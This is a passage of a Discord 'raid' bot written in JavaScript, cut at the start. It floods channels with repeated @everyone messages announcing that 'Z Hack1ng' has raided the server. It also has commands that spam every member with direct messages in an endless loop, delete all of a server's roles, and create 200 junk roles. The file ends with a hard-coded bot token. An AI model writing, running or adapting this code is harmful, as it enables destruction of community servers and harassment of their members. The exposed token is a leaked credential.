        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        

      })
    }
  }
});

//mdall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ".mdall")
    message.delete()
  message.guild.members.cache.forEach(member => {
    setInterval(function() {
      member.send("#Z Hack1ng x ! Jimo On Top https://discord.gg/2n7GVkAT6x").catch(error => { });
    }, 450);
  })
});


//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('.eliminarroles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '.crearroles') {
    message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `! Jimo#9770 OnToP`, color: '#d41818', }, reason: 'razon', })
    };
  }
});





client.login("MTAzMTU2MDUxNDI1NTQ3MDYzNg.Gzfqxp.QdjKJoxJvBhhmIymFVmRv2PHgXhjhxRO4AGn34");

